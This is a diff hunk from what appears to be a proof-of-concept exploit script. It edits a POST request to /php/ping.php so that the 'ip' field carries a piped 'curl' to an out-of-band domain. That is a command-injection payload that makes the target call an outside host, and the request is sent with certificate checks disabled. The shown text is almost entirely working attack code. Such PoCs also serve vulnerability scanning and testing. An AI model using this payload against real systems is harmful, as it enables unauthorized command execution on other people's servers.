@@ -41,7 +41,7 @@ def poc(url):
 
         path = """/php/ping.php"""
         method = "POST"
-        data = """sondata[ip]=a|curl oob_domain&jsondata[type]=1"""
+        data = """sondata[ip]=a|curl {oob_domain}&jsondata[type]=1""".format(oob_domain=oob_domain)
         headers = {'Content-Type': 'application/x-www-form-urlencoded'}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
